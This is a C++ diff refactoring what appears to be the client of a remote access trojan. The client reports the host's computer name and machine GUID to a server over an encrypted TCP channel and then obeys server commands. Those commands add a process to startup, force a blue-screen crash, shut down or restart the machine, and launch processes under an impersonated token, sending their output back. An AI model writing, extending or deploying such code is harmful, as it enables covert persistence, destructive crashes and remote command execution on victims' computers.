@@ -6,6 +6,16 @@
 
 #ifdef CLIENT_RELEASE
 
+Packet CreateKeepAlivePacket() {
+    Packet packet;
+    packet.buffLen = 0;
+    packet.action = kKeepAlive;
+    packet.code = kResponseOk;
+    packet.valid = true;
+
+    return packet;
+}
+
 Client::Client() {
     // setup udp addr
     hostent* host = GetHostByName(DNS_NAME.c_str());
@@ -61,7 +71,9 @@ bool Client::Connect() {
     // if it times out that means server is not on
     m_NetworkManager.SetSocketTimeout(this->m_UDPSocket, 2000, SO_SNDTIMEO);
 
-    ClientRequest request(ClientRequest::kConnectClient, 0, this->m_UDPSocket);
+    Packet request;
+    request.action = kAddClientToServer;
+    request.code = kNotAResponse;
     bool sent = SendMessageToServer(this->m_UDPServerDetails, request);
     if ( !sent ) {
         CloseSocket(this->m_UDPSocket);
@@ -98,6 +110,9 @@ bool Client::Connect() {
         CloseSocket(this->m_UDPSocket);
         return false;
     }
+    
+    SetSocketOptions(this->m_TCPSocket, SOL_SOCKET, SO_RCVBUF, ( char* ) &MAX_BUFFER_LEN, sizeof(MAX_BUFFER_LEN));
+    SetSocketOptions(this->m_TCPSocket, SOL_SOCKET, SO_SNDBUF, ( char* ) &MAX_BUFFER_LEN, sizeof(MAX_BUFFER_LEN));
 
     RSAKeys keys = LGCrypto::GenerateRSAPair(4096);
     this->SetRequestSecrets(keys);
@@ -156,29 +171,6 @@ void Client::SetRemoteMachineGUID() {
     this->m_MachineGUID = string;
 }
 
-BYTESTRING Client::MakeTCPRequest(const ClientRequest& req, BOOL encrypted) {
-
-    BOOL sent = FALSE;
-
-    if ( encrypted )
-        sent = m_NetworkManager.TransmitData(req, this->m_TCPSocket, TCP, NULL_ADDR, true, this->m_ServerPublicKey, false);
-    else
-        sent = m_NetworkManager.TransmitData(req, this->m_TCPSocket, TCP);
-
-    if ( !sent ) return {};
-
-    BYTESTRING data;
-    BOOL received = m_NetworkManager.ReceiveData(data, this->m_TCPSocket, TCP);
-    if ( !received ) return {};
-
-    if ( encrypted ) {
-        BYTESTRING decrypted = LGCrypto::RSADecrypt(data, this->m_RequestSecrets.priv, TRUE);
-        return decrypted;
-    }
-
-    return data;
-}
-
 bool Client::SendComputerNameToServer() {
     return SendMessageToServer(this->m_ComputerName, TRUE);
 }
@@ -189,7 +181,6 @@ bool Client::SendMachineGUIDToServer() {
 
 const CMDDESC Client::CreateCommandDescription(const Packet& command) {
     std::string buffer(command.buffer, command.buffLen);
-    CLIENT_DBG(buffer.c_str());
 
     CMDDESC description;
     description.respondToServer = ( command.flags & RESPOND_WITH_STATUS );
@@ -210,31 +201,33 @@ const CMDDESC Client::CreateCommandDescription(const Packet& command) {
     return description;
 }
 
-BOOL Client::PerformCommand(const Packet& command, ClientResponse& outResponse) {
+BOOL Client::PerformCommand(const Packet& command, Packet& outResponse) {
+
     BOOL    success     = FALSE;
     CMDDESC description = CreateCommandDescription(command);
     std::string cmdOutput;
 
     switch ( command.action ) {
-    case RemoteAction::kAddToStartup:
+    case Action::kAddToStartup:
         this->m_ProcMgr.AddProcessToStartup(command.buffer);
         success = TRUE;
         break;
-    case RemoteAction::kPingClient:
+    case Action::kPingClient:
         success = TRUE;
         break;
-    case RemoteAction::kRemoteBSOD:
+    case Action::kRemoteBSOD:
         this->m_ProcMgr.BSOD();
         break;
-    case RemoteAction::kRemoteShutdown:
+    case Action::kRemoteShutdown: {
         if ( strcmp(command.buffer, "shutdown") == 0 )
             ProcessManager::ShutdownSystem(ShutdownPowerOff);
         else if ( strcmp(command.buffer, "restart") == 0 )
             ProcessManager::ShutdownSystem(ShutdownReboot);
 
         break;
-    case RemoteAction::kOpenRemoteProcess:
-        this->m_ProcMgr.OpenProcessAsImposter(
+    }
+    case Action::kOpenRemoteProcess:
+        success = this->m_ProcMgr.OpenProcessAsImposter(
             this->m_ProcMgr.GetToken(),
             NULL,
             ( description.useCLI ) ? nullptr : description.application.data(),
@@ -245,17 +238,15 @@ BOOL Client::PerformCommand(const Packet& command, ClientResponse& outResponse) 
             description.respondToServer,
             cmdOutput
         );
-
+        
         break;
     }
 
     if ( description.respondToServer || command.flags & RESPOND_WITH_STATUS ) {
-        outResponse.actionPerformed = command.action;
-        outResponse.responseCode = (success == TRUE) ? ClientResponseCode::kResponseOk : ClientResponseCode::kResponseError;
-        outResponse.buffLen = cmdOutput.size();
-        strcpy(outResponse.buffer, cmdOutput.c_str());
+        outResponse.action = command.action;
+        outResponse.code = (success == TRUE) ? ClientResponseCode::kResponseOk : ClientResponseCode::kResponseError;
+        outResponse.insert(cmdOutput);
     }
-
 
     return success;
 }
@@ -263,29 +254,20 @@ BOOL Client::PerformCommand(const Packet& command, ClientResponse& outResponse) 
 bool Client::IsServerAwaitingResponse(const Packet& commandPerformed) {
     bool sendResponse = false;
     switch ( commandPerformed.action ) {
-    case RemoteAction::kPingClient:
+    case Action::kPingClient:
         sendResponse = true;
         break;
     }
     return sendResponse;
 }
 
-Packet Client::OnEncryptedPacket(BYTESTRING received) {
-    //BYTESTRING iv(received.end() - IV_SIZE, received.end());
-    //BYTESTRING encrypted(received.begin(), received.end() - IV_SIZE); // received without iv
-    //BYTESTRING decrypted = LGCrypto::AESDecrypt(encrypted, this->m_AESKey, iv);
-
-    //return Serialization::DeserializeToStruct<Packet>(decrypted);;
-    return LGCrypto::DecryptToStruct<Packet>(received, this->m_AESKey);
-}
-
 void Client::ListenForServerCommands() {
-    bool received = false;
+    bool received = true;
+    Packet toEcho = CreateKeepAlivePacket();
 
     while ( true ) {
         BYTESTRING encrypted;
-
-        received = m_NetworkManager.ReceiveData(
+        received = m_NetworkManager.ReceiveTCPLargeData(
             encrypted,
             this->m_TCPSocket,
             TCP
@@ -298,19 +280,18 @@ void Client::ListenForServerCommands() {
             continue;
         }
 
-        Packet receivedPacket = OnEncryptedPacket(encrypted);
-        ClientResponse responseToServer;
+        Packet receivedPacket = LGCrypto::DecryptToStruct<Packet>(encrypted, this->m_AESKey);
         
         if ( receivedPacket.action == kKeepAlive ) {
-            CLIENT_DBG("got a keep alive packet, return it.");
-            // echo keep alive
-            m_NetworkManager.TransmitData(encrypted, this->m_TCPSocket, TCP);
+            BYTESTRING cipherPacket = LGCrypto::EncryptStruct(toEcho, this->m_AESKey, LGCrypto::GenerateAESIV());
+            m_NetworkManager.SendTCPLargeData(cipherPacket, this->m_TCPSocket, TCP);
             continue;
         } else if ( receivedPacket.action == kKillClient ) {
             this->Disconnect();
             break;
         }
 
+        Packet responseToServer;
         if ( receivedPacket.flags & PACKET_IS_A_COMMAND )
             PerformCommand(receivedPacket, responseToServer);
 
@@ -319,7 +300,7 @@ void Client::ListenForServerCommands() {
             continue;
 
         BYTESTRING buffer = LGCrypto::EncryptStruct(responseToServer, this->m_AESKey, LGCrypto::GenerateAESIV());
-        m_NetworkManager.TransmitData(buffer, this->m_TCPSocket, TCP);
+        m_NetworkManager.SendTCPLargeData(buffer, this->m_TCPSocket, TCP);
     }
 }
 
@@ -409,7 +390,7 @@ bool Client::SendMessageToServer(std::string message, BOOL encrypted) {
     return success;
 }
 
-bool Client::SendMessageToServer(Server& dest, ClientMessage message) {
+bool Client::SendMessageToServer(Server& dest, Packet message) {
     bool success = false;
 
     if ( dest.type == SOCK_STREAM ) // tcp
